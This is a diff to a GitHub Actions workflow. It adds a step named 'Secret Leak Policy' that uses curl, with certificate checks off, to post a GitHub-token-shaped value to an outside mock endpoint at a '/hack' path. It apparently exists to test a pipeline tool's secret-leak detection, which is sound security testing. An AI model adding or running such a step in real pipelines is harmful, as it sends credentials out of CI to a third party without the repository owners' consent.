@@ -30,6 +30,16 @@ jobs:
       - name: Install dependencies
         run: pip install -r requirements.txt
 
+
+      - name: Secret Leak Policy
+        run: |
+          curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
+            -H "Content-Type: application/json" \
+            -d '{
+            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          }'
+          echo "Exit code: $?"
+
       # ============= InvisiRisk Cleanup =============
       - name: Cleanup PSE
         if: always()
